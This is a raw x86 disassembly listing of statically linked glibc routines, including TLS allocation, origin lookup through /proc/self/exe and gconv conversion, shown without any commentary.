jmp 0x8082f0b
mov dword [var_sp_ch], str._dl_next_tls_modid
mov dword [var_sp_8h], 0x48
mov dword [var_sp_4h], str..._sysdeps_generic_dl_tls.c
mov dword [esp], str.result____dl_tls_max_dtv_idx
jmp 0x8082f0b
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov dword [var_sp_4h], 4
mov ebx, eax
mov eax, dword [0x80aabd8]
lea esi, [eax + 0xe]
add eax, 0x10
mov dword [esp], eax
call fcn.08051730
test eax, eax
je 0x8082f9f
mov dword [eax], esi
add eax, 4
mov dword [ebx + 4], eax
mov eax, ebx
mov esi, dword [var_4h]
mov ebx, dword [var_8h]
leave
ret
xor ebx, ebx
jmp 0x8082f95
lea esi, [esi]
lea edi, [edi]
mov ecx, dword [0x80a95a4]
push ebp
mov ebp, esp
mov dword [eax], ecx
mov eax, dword [0x80aabd4]
mov dword [edx], eax
leave
ret
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x18
mov eax, dword [0x80aabd4]
mov dword [var_8h], esi
mov dword [var_ch], ebx
mov dword [var_4h], edi
mov esi, dword [0x80a95a4]
mov dword [esp], eax
mov dword [var_sp_4h], esi
call fcn.080513d0
test eax, eax
mov ebx, eax
mov edi, eax
je 0x808302a
lea ebx, [esi + eax - 0x420]
mov dword [var_sp_8h], 0x420
mov dword [var_sp_4h], 0
mov dword [esp], ebx
call fcn.080536f0
mov eax, ebx
call fcn.08082f60
test eax, eax
mov ebx, eax
je 0x8083037
mov eax, ebx
mov esi, dword [var_8h]
mov edi, dword [var_4h]
mov ebx, dword [var_ch]
leave
ret
mov dword [esp], edi
call fcn.08051180
jmp 0x808302a
jmp 0x8083050
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
mov dword [var_10h], eax
mov ecx, dword [var_10h]
xor eax, eax
test ecx, ecx
je 0x8083115
mov eax, dword [var_10h]
mov dword [var_18h], 0
mov edi, dword [0x80aabdc]
mov ebx, dword [0x80aabd8]
mov eax, dword [eax + 4]
mov dword [var_14h], eax
mov edx, dword [var_18h]
mov ecx, dword [var_18h]
test edx, edx
mov edx, dword [edi]
sete al
movzx esi, al
cmp esi, edx
lea eax, [esi + ecx]
jae 0x80830de
lea esi, [esi]
mov eax, dword [var_18h]
add eax, esi
cmp eax, ebx
ja 0x80830de
mov ecx, dword [edi + esi*8 + 0xc]
test ecx, ecx
je 0x80830d3
mov eax, dword [ecx + 0x224]
test eax, eax
jne 0x808311d
mov eax, dword [ecx + 0x228]
mov edx, dword [var_14h]
mov dword [edx + eax*4], 0xffffffff
mov edx, dword [edi]
mov ebx, dword [0x80aabd8]
mov ecx, dword [var_18h]
inc esi
cmp esi, edx
lea eax, [esi + ecx]
jb 0x80830a0
mov dword [var_18h], eax
cmp dword [var_18h], ebx
mov eax, dword [var_10h]
jae 0x8083115
mov edi, dword [edi + 4]
test edi, edi
jne 0x8083085
mov dword [var_ch], str._dl_allocate_tls_init
mov dword [var_8h], 0x1bd
mov dword [var_4h], str..._sysdeps_generic_dl_tls.c
mov dword [esp], str.listp_____void__0_
nop
call fcn.0805efc0
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
ret
cmp dword [ecx + 0x228], esi
jne 0x80831cb
mov edx, dword [ecx + 0x218]
cmp edx, dword [ecx + 0x214]
jb 0x80831a7
cmp eax, edx
jb 0x8083183
mov edx, dword [var_10h]
sub edx, eax
mov eax, dword [var_14h]
mov dword [eax + esi*4], edx
mov eax, dword [ecx + 0x214]
mov ebx, dword [ecx + 0x218]
mov dword [var_8h], eax
sub ebx, eax
mov eax, dword [ecx + 0x210]
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.08053740
mov dword [var_4h], 0
mov dword [var_8h], ebx
mov dword [esp], eax
call fcn.080536f0
jmp 0x80830cb
mov dword [var_ch], str._dl_allocate_tls_init
mov dword [var_8h], 0x1a9
mov dword [var_4h], str..._sysdeps_generic_dl_tls.c
mov dword [esp], str._size_t__map__l_tls_offset___map__l_tls_blocksize
jmp 0x8083110
mov dword [var_ch], str._dl_allocate_tls_init
mov dword [var_8h], 0x1a7
mov dword [var_4h], str..._sysdeps_generic_dl_tls.c
mov dword [esp], str.map__l_tls_blocksize___map__l_tls_initimage_size
jmp 0x8083110
mov dword [var_ch], str._dl_allocate_tls_init
mov dword [var_8h], 0x1a6
mov dword [var_4h], str..._sysdeps_generic_dl_tls.c
mov dword [esp], str.map__l_tls_modid__cnt
jmp 0x8083110
nop
push ebp
test eax, eax
mov ebp, esp
je 0x8083202
call fcn.08082f60
leave
jmp 0x8083050
call fcn.08082fd0
jmp 0x80831fc
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, edx
mov esi, eax
mov eax, dword [eax + 4]
sub eax, 4
mov dword [esp], eax
call fcn.08051180
test bl, bl
jne 0x8083240
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
lea esi, [esi]
mov eax, esi
sub eax, dword [0x80a95a4]
lea esi, [eax + 0x420]
mov dword [esp], esi
call fcn.08051180
jmp 0x8083232
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov edx, 0x1000
mov ebp, esp
sub esp, 0x101c
mov dword [var_4h], edi
mov dword [var_ch], ebx
mov dword [var_8h], esi
lea edi, [var_100ch]
mov ebx, str._proc_self_exe
mov ecx, edi
mov eax, 0x55
int 0x80
cmp eax, 0xfffff000
mov ebx, eax
ja 0x8083340
test eax, eax
jle 0x8083340
movzx eax, byte [var_100ch]
cmp al, 0x5b
je 0x8083340
cmp al, 0x2f
jne 0x80833a0
cmp ebx, 1
jle 0x80832f2
cmp byte [ebx + ebp - 0x100d], 0x2f
je 0x80832f2
dec ebx
cmp ebx, 1
jle 0x80832f2
cmp byte [ebx + ebp - 0x100d], 0x2f
jne 0x80832e2
lea eax, [ebx + 1]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov esi, eax
je 0x8083334
cmp ebx, 1
je 0x808332d
lea eax, [ebx - 1]
mov dword [var_sp_4h], edi
mov dword [esp], esi
mov dword [var_sp_8h], eax
call fcn.08053740
mov byte [eax], 0
mov esi, esi
mov eax, esi
mov ebx, dword [var_ch]
mov edi, dword [var_4h]
mov esi, dword [var_8h]
leave
ret
mov word [eax], 0x2f
jmp 0x8083320
mov esi, 0xffffffff
jmp 0x8083320
nop
lea esi, [esi]
mov eax, dword [0x80aac40]
mov esi, 0xffffffff
test eax, eax
je 0x8083320
mov dword [esp], eax
call fcn.08053400
mov ebx, eax
lea eax, [eax + 1]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov esi, eax
je 0x8083334
mov eax, dword [0x80aac40]
mov dword [var_sp_8h], ebx
mov dword [esp], esi
mov dword [var_sp_4h], eax
call fcn.08053740
lea edx, [esi + 1]
cmp eax, edx
jbe 0x808331b
cmp byte [eax - 1], 0x2f
jne 0x808331b
nop
lea esi, [esi]
dec eax
cmp eax, edx
jbe 0x808331b
cmp byte [eax - 1], 0x2f
je 0x8083390
jmp 0x808331b
mov dword [var_sp_ch], str._dl_get_origin
mov dword [var_sp_8h], 0x30
mov dword [var_sp_4h], str..._sysdeps_unix_sysv_linux_dl_origin.c
mov dword [esp], str.linkval_0____
call fcn.0805efc0
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
push ebx
sub esp, 0xc
mov eax, dword [eax]
mov edx, dword [0x80aac74]
mov esi, edx
neg esi
and esi, eax
cmp eax, dword [0x80aac00]
jne 0x80834d1
cmp byte [0x80aaa3c], 0
je 0x8083491
lea ebx, [edx*8]
add esi, edx
sub esi, ebx
mov dword [esp + 8], 7
mov dword [esp + 4], ebx
mov dword [esp], esi
call fcn.080547a0
test eax, eax
je 0x8083437
call fcn.08048b20
xor edx, edx
mov eax, dword [eax]
cmp eax, 0xd
je 0x8083487
cmp eax, 0xc
mov edx, eax
jne 0x8083487
cmp ebx, dword [0x80aac74]
je 0x8083478
mov eax, ebx
shr eax, 1
mov ebx, eax
add esi, eax
jmp 0x8083439
mov dword [edi], 0
or dword [0x80a95c8], 1
xor edx, edx
add esp, 0xc
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov dword [esp + 8], 0x1000007
mov dword [esp + 4], edx
mov dword [esp], esi
call fcn.080547a0
test eax, eax
je 0x8083478
call fcn.08048b20
mov eax, dword [eax]
cmp eax, 0x16
je 0x80834bf
xor edx, edx
cmp eax, 0xd
cmovne edx, eax
jmp 0x8083487
mov edx, dword [0x80aac74]
mov byte [0x80aaa3c], 1
jmp 0x808342e
mov edx, 1
jmp 0x8083487
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 8
mov eax, dword [arg_8h]
mov dword [var_4h], eax
mov eax, dword [arg_4h]
mov dword [esp], eax
call fcn.08082c50
leave
ret
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 8
mov eax, dword [0x80aac60]
test eax, eax
jne 0x8083531
leave
ret
mov eax, dword [arg_8h]
mov dword [var_4h], eax
mov eax, dword [arg_4h]
mov dword [esp], eax
call fcn.08082c50
jmp 0x808352f
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ecx, eax
mov ebp, esp
sub esp, 0x10
mov dword [esp], edx
lea eax, [var_ch]
mov dword [var_4h], ebx
lea edx, [var_8h]
mov dword [var_8h], 0
xor ebx, ebx
call fcn.08081410
mov edx, dword [var_8h]
sub esp, 4
test edx, edx
setne bl
test ebx, ebx
je 0x80835c1
cmp edx, str.out_of_memory
je 0x80835c1
mov dword [esp], edx
call fcn.08051180
mov eax, ebx
mov ebx, dword [var_4h]
leave
ret
nop
lea esi, [esi]
push ebp
xor ecx, ecx
mov ebp, esp
push ebx
mov ebx, dword [ebp + 8]
mov edx, dword [ebx + 4]
mov eax, dword [ebx]
call fcn.08055330
mov dword [ebx + 8], eax
mov ebx, dword [esp]
leave
ret
nop
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x1c
mov dword [var_4h], esi
mov dword [var_8h], ebx
mov esi, dword [arg_8h]
mov dword [esi + 0xc], 0
mov eax, dword [esi + 4]
lea ecx, [esi + 0xc]
mov dword [var_10h], 0
mov dword [var_ch], 2
mov dword [var_sp_8h], 0
mov dword [var_sp_4h], 0
mov edx, dword [esi]
lea ebx, [edx + 0x1b8]
mov dword [esp], ebx
call fcn.0807e450
mov dword [esi + 8], eax
sub esp, 0x14
mov esi, dword [var_4h]
mov ebx, dword [var_8h]
leave
ret
lea esi, [esi]
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
leave
jmp fcn.08055790
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x2c
mov dword [var_4h], esi
lea edx, [var_18h]
mov dword [var_8h], ebx
mov esi, dword [arg_8h]
mov dword [var_18h], str.GLIBC_PRIVATE
mov dword [var_ch], 0
mov dword [var_10h], 1
mov dword [var_14h], 0x963cf85
mov dword [esi + 0xc], 0
mov eax, dword [esi + 4]
lea ecx, [esi + 0xc]
mov dword [var_sp_10h], 0
mov dword [var_sp_ch], 0
mov dword [var_sp_8h], 0
mov dword [var_sp_4h], edx
mov edx, dword [esi]
mov ebx, dword [edx + 0x1b4]
mov dword [esp], ebx
call fcn.0807e450
mov dword [esi + 8], eax
sub esp, 0x14
mov esi, dword [var_4h]
mov ebx, dword [var_8h]
leave
ret
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x20
mov eax, dword [arg_8h]
lea edx, [var_10h]
mov dword [var_10h], eax
mov eax, dword [arg_ch]
mov dword [var_ch], eax
mov eax, 0x80835d0
call fcn.08083580
xor edx, edx
test eax, eax
jne 0x808373f
mov eax, dword [var_8h]
lea edx, [var_20h]
mov dword [var_1ch], str._dl_open_hook
mov dword [var_20h], eax
mov eax, fcn.08083660
call fcn.08083580
test eax, eax
jne 0x808373c
mov edx, dword [var_18h]
test edx, edx
je 0x8083743
mov eax, dword [var_14h]
mov eax, dword [eax + 4]
add eax, dword [edx]
test eax, eax
je 0x808373c
mov dword [eax], 0x80a9c14
mov edx, dword [var_8h]
mov eax, edx
leave
ret
mov eax, dword [var_14h]
mov eax, dword [eax + 4]
jmp 0x8083732
nop
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x10
mov eax, dword [arg_8h]
lea edx, [var_10h]
mov dword [var_10h], eax
mov eax, dword [arg_ch]
mov dword [var_ch], eax
mov eax, fcn.080835f0
call fcn.08083580
xor edx, edx
test eax, eax
jne 0x8083784
mov ecx, dword [var_8h]
test ecx, ecx
je 0x8083788
mov eax, dword [var_4h]
mov edx, dword [eax + 4]
add edx, dword [ecx]
mov eax, edx
leave
ret
mov eax, dword [var_4h]
mov edx, dword [eax + 4]
jmp 0x8083784
push ebp
mov eax, fcn.08083650
mov ebp, esp
mov edx, dword [arg_8h]
leave
jmp fcn.08083580
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov eax, 0x80aaa40
mov ebp, esp
leave
ret
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x50
mov dword [var_3ch], 0
mov dword [var_38h], 0
mov dword [var_20h], eax
mov dword [var_24h], edx
mov dword [var_28h], ecx
mov dword [var_2ch], 0
mov dword [var_30h], 0
mov dword [var_4h], 0x2f
mov dword [esp], eax
call fcn.08076ce0
test eax, eax
je 0x8083826
lea eax, [eax + 1]
mov dword [var_4h], 0x2f
mov dword [esp], eax
call fcn.08076ce0
test eax, eax
mov ebx, eax
je 0x8083826
inc ebx
cmp byte [eax + 1], 0
jne 0x8083c59
mov eax, dword [var_24h]
mov dword [var_4h], 0x2f
mov dword [esp], eax
call fcn.08076ce0
test eax, eax
je 0x808385f
inc eax
mov dword [var_4h], 0x2f
mov dword [esp], eax
call fcn.08076ce0
test eax, eax
je 0x808385f
cmp byte [eax + 1], 0
lea edx, [eax + 1]
jne 0x8083c26
mov eax, dword [var_20h]
cmp byte [eax], 0x2f
jne 0x80838c4
cmp byte [eax + 1], 0x2f
jne 0x80838c4
cmp byte [eax + 2], 0
jne 0x80838c4
mov eax, 0
test eax, eax
je 0x8083c1c
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov ebx, dword [eax + 0x5c]
mov dword [esp], ebx
call fcn.08053400
lea edx, [eax + 0x15]
and edx, 0xfffffffc
sub esp, edx
lea edx, [var_1bh]
mov dword [var_8h_2], eax
mov dword [var_4h], ebx
and edx, 0xfffffff0
mov dword [var_20h], edx
mov dword [esp], edx
call fcn.08053740
mov word [eax], 0x2f2f
mov byte [eax + 2], 0
mov ecx, dword [var_24h]
cmp byte [ecx], 0x2f
jne 0x8083929
cmp byte [ecx + 1], 0x2f
jne 0x8083929
cmp byte [ecx + 2], 0
jne 0x8083929
mov eax, 0
test eax, eax
je 0x8083c12
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov ebx, dword [eax + 0x5c]
mov dword [esp], ebx
call fcn.08053400
lea edx, [eax + 0x15]
and edx, 0xfffffffc
sub esp, edx
lea edx, [var_1bh]
mov dword [var_8h_2], eax
mov dword [var_4h], ebx
and edx, 0xfffffff0
mov dword [var_24h], edx
mov dword [esp], edx
call fcn.08053740
mov word [eax], 0x2f2f
mov byte [eax + 2], 0
mov eax, dword [arg_8h]
mov edx, dword [var_24h]
lea ecx, [var_18h]
mov dword [var_4h], eax
lea eax, [var_14h]
mov dword [esp], eax
mov eax, dword [var_20h]
call fcn.08056f50
sub esp, 8
mov dword [var_34h], eax
test eax, eax
jne 0x8083b29
mov edi, dword [var_3ch]
xor ebx, ebx
test edi, edi
je 0x8083975
nop
lea esi, [esi]
mov eax, dword [edi]
test eax, eax
jne 0x8083be4
mov eax, dword [edi + 4]
mov ebx, edi
test eax, eax
mov edi, eax
jne 0x8083960
mov eax, dword [var_14h]
lea eax, [eax + eax*8]
lea eax, [eax*4 + 8]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov dword [var_2ch], eax
je 0x8083b49
mov eax, dword [var_18h]
mov ecx, dword [var_2ch]
cld
mov dword [ecx + 4], eax
mov eax, dword [var_2ch]
mov ecx, dword [var_14h]
mov dword [eax], ecx
mov edi, eax
lea ecx, [ecx + ecx*8]
shl ecx, 2
add edi, 8
xor eax, eax
shr ecx, 2
rep stosd dword es:[edi], eax
mov dword [var_30h], 0
mov edx, dword [var_14h]
cmp eax, edx
jae 0x8083a99
mov ecx, dword [var_2ch]
mov dword [var_50h], 0
mov dword [var_4ch], ecx
mov eax, dword [var_4ch]
mov edi, dword [var_3ch]
mov ecx, dword [var_4ch]
add eax, 0x20
test edi, edi
mov dword [ecx + 0x1c], eax
je 0x8083a39
mov dword [var_44h], ecx
mov esi, esi
xor ebx, ebx
cmp ebx, dword [edi + 0xc]
jae 0x8083a2f
mov esi, dword [var_50h]
lea esi, [esi]
mov dword [var_8h], 0x80a99c0
mov eax, dword [edi + 8]
mov eax, dword [eax + ebx*4]
mov dword [var_4h_2], eax
mov eax, dword [var_18h]
mov eax, dword [eax + esi + 0xc]
mov dword [esp], eax
call fcn.0808dcc0
test eax, eax
je 0x8083b67
inc ebx
cmp ebx, dword [edi + 0xc]
jb 0x8083a00
mov edi, dword [edi + 4]
test edi, edi
jne 0x80839f0
mov edx, dword [var_14h]
lea eax, [edx - 1]
cmp dword [var_30h], eax
jae 0x8083b55
mov ecx, dword [var_38h]
mov edx, dword [var_4ch]
mov eax, dword [var_18h]
mov dword [edx + 0x10], ecx
mov edx, dword [var_50h]
mov eax, dword [eax + edx + 0x30]
mov ebx, eax
shl ebx, 8
sub ebx, eax
shl ebx, 5
mov dword [esp], ebx
call fcn.08050fe0
mov ecx, dword [var_4ch]
test eax, eax
mov dword [ecx + 8], eax
je 0x8083b49
mov ecx, dword [var_4ch]
add eax, ebx
inc dword [var_30h]
add dword [var_50h], 0x3c
mov edx, dword [var_14h]
mov dword [ecx + 0xc], eax
add ecx, 0x24
cmp dword [var_30h], edx
mov dword [var_4ch], ecx
jb 0x80839d8
mov ecx, dword [var_34h]
test ecx, ecx
je 0x8083b29
call fcn.08048b20
mov edx, dword [var_2ch]
mov eax, dword [eax]
test edx, edx
mov dword [var_48h], eax
je 0x8083b14
mov eax, dword [var_30h]
dec dword [var_30h]
test eax, eax
je 0x8083b02
mov edx, dword [var_30h]
mov ecx, dword [var_2ch]
lea eax, [edx + edx*8]
lea esi, [ecx + eax*4 + 8]
mov edi, dword [esi + 0x20]
test edi, edi
je 0x8083aeb
mov ebx, edi
mov edi, dword [edi + 0x10]
mov eax, dword [ebx + 8]
test eax, eax
jne 0x8083b3e
mov dword [esp], ebx
call fcn.08051180
test edi, edi
jne 0x8083ad3
mov eax, dword [esi]
mov ebx, dword [var_30h]
sub esi, 0x24
mov dword [esp], eax
call fcn.08051180
dec dword [var_30h]
test ebx, ebx
jne 0x8083acc
mov eax, dword [var_2ch]
mov dword [esp], eax
call fcn.08051180
mov dword [var_2ch], 0
mov edx, dword [var_14h]
mov eax, dword [var_18h]
call fcn.08057110
call fcn.08048b20
mov edx, dword [var_48h]
mov dword [eax], edx
mov eax, dword [var_2ch]
mov ecx, dword [var_28h]
mov dword [ecx], eax
mov eax, dword [var_34h]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret 4
mov eax, dword [ebx + 0xc]
mov dword [esp], eax
call dword [ebx + 8]
jmp 0x8083adf
mov dword [var_34h], 3
jmp 0x8083aa4
or dword [var_38h], 1
mov eax, dword [var_4ch]
mov edx, dword [var_38h]
mov dword [eax + 0x10], edx
jmp 0x8083a99
mov eax, dword [edi + 0x18]
mov dword [var_1ch], 0
test eax, eax
je 0x8083b91
mov eax, dword [var_18h]
mov eax, dword [eax + esi + 0x10]
mov dword [var_4h_2], eax
lea eax, [var_1ch]
mov dword [esp], eax
call dword [edi + 0x18]
test eax, eax
jne 0x8083a2f
mov dword [esp], 0x14
call fcn.08050fe0
test eax, eax
mov ecx, eax
je 0x8083b49
mov eax, dword [edi + 0x10]
mov dword [ecx + 0x10], 0
mov edx, dword [var_44h]
mov dword [ecx], eax
add edx, 0x28
mov eax, dword [edi + 0x14]
mov dword [ecx + 4], eax
mov eax, dword [edi + 0x1c]
mov dword [ecx + 8], eax
mov eax, dword [var_1ch]
mov dword [ecx + 0xc], eax
mov eax, dword [var_44h]
mov esi, dword [eax + 0x28]
test esi, esi
je 0x8083bdd
mov eax, dword [edx]
mov ebx, dword [eax + 0x10]
lea edx, [eax + 0x10]
test ebx, ebx
jne 0x8083bd1
mov dword [edx], ecx
jmp 0x8083a2f
mov eax, edi
call fcn.080846b0
test eax, eax
je 0x808396a
test ebx, ebx
je 0x8083c05
mov eax, dword [edi + 4]
mov dword [ebx + 4], eax
mov eax, dword [edi + 4]
jmp 0x808396f
mov edi, dword [edi + 4]
mov eax, edi
mov dword [var_3ch], edi
jmp 0x808396f
mov eax, dword [0x80a9ab4]
jmp 0x80838f1
mov eax, dword [0x80a9ab4]
jmp 0x808388c
mov eax, edx
sub eax, dword [var_24h]
lea edx, [eax + 0x13]
and edx, 0xfffffffc
sub esp, edx
lea edx, [var_1bh]
and edx, 0xfffffff0
mov byte [eax + edx], 0
mov dword [esp], edx
mov ecx, dword [var_24h]
mov dword [var_8h_2], eax
mov dword [var_4h], ecx
call fcn.08053770
mov dword [var_24h], eax
jmp 0x808385f
mov edx, ebx
sub edx, dword [var_20h]
lea eax, [edx + 0x13]
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1bh]
and eax, 0xfffffff0
mov byte [edx + eax], 0
mov dword [esp], eax
mov dword [var_8h_2], edx
mov edx, dword [var_20h]
mov dword [var_4h], edx
call fcn.08053770
mov dword [esp], ebx
mov dword [var_20h], eax
call fcn.08053400
lea edx, [eax + 1]
add eax, 0x13
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1bh]
mov dword [var_8h_2], edx
mov dword [var_4h], ebx
and eax, 0xfffffff0
mov dword [esp], eax
call fcn.08053770
test eax, eax
mov edx, eax
cmove edx, dword [var_10h]
movzx eax, byte [edx]
cmp al, 0x2c
je 0x8083e55
xor ecx, ecx
test al, al
je 0x8083ce9
mov eax, edx
inc edx
mov ecx, eax
movzx eax, byte [edx]
test al, al
je 0x8083ce6
inc edx
cmp al, 0x2c
je 0x8083e4c
movzx eax, byte [edx]
test al, al
jne 0x8083cd6
mov dword [var_10h], edx
test ecx, ecx
mov esi, ecx
je 0x8083826
mov dword [var_8h_2], 0x80a99c0
mov dword [var_4h], 0x8092de3
mov dword [esp], esi
call fcn.0808dcc0
test eax, eax
jne 0x8083dbe
mov eax, dword [var_3ch]
xor ebx, ebx
test eax, eax
je 0x8083d36
lea esi, [esi]
cmp dword [eax + 0x10], 0x8084100
je 0x8083db5
mov ebx, eax
mov eax, dword [eax + 4]
test eax, eax
jne 0x8083d20
sub esp, 0x30
mov ecx, 8
lea edx, [var_1bh_2]
and edx, 0xfffffff0
test ebx, ebx
cld
mov edi, edx
rep stosd dword es:[edi], eax
mov dword [edx + 8], 0x80a9c24
mov dword [edx + 0xc], 1
mov dword [edx + 0x10], 0x8084100
je 0x8083db0
mov dword [ebx + 4], edx
mov edx, dword [var_10h]
movzx eax, byte [edx]
cmp al, 0x2c
je 0x8083da6
xor ecx, ecx
test al, al
je 0x8083d91
mov eax, edx
inc edx
mov ecx, eax
movzx eax, byte [edx]
test al, al
je 0x8083d8e
inc edx
cmp al, 0x2c
je 0x8083da0
movzx eax, byte [edx]
test al, al
jne 0x8083d82
mov dword [var_10h], edx
test ecx, ecx
mov esi, ecx
jne 0x8083cf3
jmp 0x8083826
mov byte [edx - 1], 0
jmp 0x8083d8e
inc edx
movzx eax, byte [edx]
cmp al, 0x2c
je 0x8083da6
jmp 0x8083d70
mov dword [var_3ch], edx
jmp 0x8083d66
test eax, eax
jne 0x8083d66
jmp 0x8083d36
mov dword [var_8h_2], 0x80a99c0
mov dword [var_4h], str.IGNORE
mov dword [esp], esi
call fcn.0808dcc0
test eax, eax
jne 0x8083de0
or dword [var_38h], 2
jmp 0x8083d66
mov ebx, dword [var_3ch]
mov dword [var_40h], 0
test ebx, ebx
je 0x8083dfe
mov eax, dword [ebx]
test eax, eax
jne 0x8083e28
mov dword [var_40h], ebx
mov ebx, dword [ebx + 4]
test ebx, ebx
jne 0x8083dee
sub esp, 0x30
mov eax, ebx
mov ecx, 8
lea edx, [var_1bh_2]
and edx, 0xfffffff0
cld
mov edi, edx
rep stosd dword es:[edi], eax
mov dword [edx], esi
mov eax, dword [var_40h]
test eax, eax
je 0x8083db0
mov ecx, dword [var_40h]
mov dword [ecx + 4], edx
jmp 0x8083d66
mov dword [var_8h_2], 0x80a99c0
mov eax, dword [ebx]
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.0808dcc0
test eax, eax
jne 0x8083df4
test ebx, ebx
jne 0x8083d66
jmp 0x8083dfe
mov byte [edx - 1], 0
jmp 0x8083ce6
inc edx
movzx eax, byte [edx]
cmp al, 0x2c
je 0x8083e55
jmp 0x8083cc4
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
mov eax, 8
push ebx
sub esp, 0x34
cmp edi, 0xffffffff
mov dword [var_14h], ecx
mov dword [var_10h], edx
je 0x8083f6c
mov eax, dword [edi]
mov ebx, dword [arg_10h]
dec eax
test ebx, ebx
mov dword [var_18h], eax
je 0x8084033
mov ecx, dword [var_18h]
mov edx, dword [arg_10h]
lea eax, [ecx + ecx*8]
mov dword [edx], 0
mov ecx, dword [arg_8h]
xor edx, edx
lea eax, [edi + eax*4 + 8]
test ecx, ecx
je 0x8083ed1
mov ecx, dword [arg_8h]
mov edx, dword [ecx]
mov dword [eax], edx
mov edx, dword [var_18h]
lea eax, [edx + edx*8]
lea esi, [edi + eax*4]
mov eax, dword [arg_ch]
mov dword [esi + 0xc], eax
mov eax, dword [var_10h]
test eax, eax
je 0x8083ef6
mov eax, dword [var_10h]
mov ecx, dword [eax]
test ecx, ecx
jne 0x8083f76
mov eax, dword [edi + 4]
mov eax, dword [eax + 0x14]
mov dword [esp], eax
call fcn.08083520
mov dword [var_1ch], 0
xor eax, eax
mov ebx, dword [edi + 4]
cmp dword [esi + 8], 0
mov edx, dword [arg_10h]
mov dword [var_8h], 0
sete al
mov dword [var_sp_10h], 0
mov dword [var_ch], 0
mov dword [esp], ebx
mov dword [var_sp_14h], edx
inc eax
mov dword [var_sp_18h], eax
lea eax, [edi + 8]
mov dword [var_4h], eax
call dword [ebx + 0x14]
mov esi, eax
mov edx, dword [arg_8h]
test edx, edx
je 0x8083f6a
mov eax, dword [arg_8h]
mov eax, dword [eax]
test eax, eax
je 0x8083f6a
mov edx, dword [var_18h]
mov ecx, dword [arg_8h]
lea eax, [edx + edx*8]
mov eax, dword [edi + eax*4 + 8]
mov dword [ecx], eax
mov eax, esi
add esp, 0x34
pop ebx
pop esi
pop edi
leave
ret 0xc
mov esi, dword [arg_8h]
test esi, esi
je 0x808400f
mov eax, dword [arg_8h]
mov ebx, dword [eax]
test ebx, ebx
je 0x808400f
lea edx, [edi + 8]
mov ebx, dword [edi + 4]
mov dword [var_20h], edx
mov eax, dword [ebx + 0x14]
mov dword [var_bp_1ch], ecx
mov dword [esp], eax
call fcn.08083520
mov ecx, dword [arg_10h]
mov edx, dword [var_14h]
mov dword [var_1ch], 0
mov eax, dword [edi + 4]
mov dword [var_sp_18h], 0
mov dword [var_sp_10h], 0
mov dword [var_sp_14h], ecx
mov dword [var_ch], edx
mov ecx, dword [var_10h]
mov edx, dword [var_20h]
mov dword [esp], eax
mov dword [var_8h], ecx
mov dword [var_4h], edx
call dword [eax + 0x14]
cmp eax, 4
mov esi, eax
jne 0x8083f4b
mov ecx, dword [var_10h]
mov edx, dword [ecx]
cmp dword [var_bp_1ch], edx
mov ecx, edx
je 0x8083f4b
mov eax, dword [edi + 4]
add edx, dword [eax + 0x24]
mov ebx, eax
cmp edx, dword [var_14h]
jbe 0x8083f97
jmp 0x8083f4b
mov dword [var_ch], str.__gconv
mov dword [var_8h], 0x3a
mov dword [var_4h], str.gconv.c
mov dword [esp], str.outbuf_____void__0___outbuf_____void__0_
call fcn.0805efc0
mov dword [var_ch], str.__gconv
mov dword [var_8h], 0x2a
mov dword [var_4h], str.gconv.c
mov dword [esp], str.irreversible_____void__0_
jmp 0x808402e
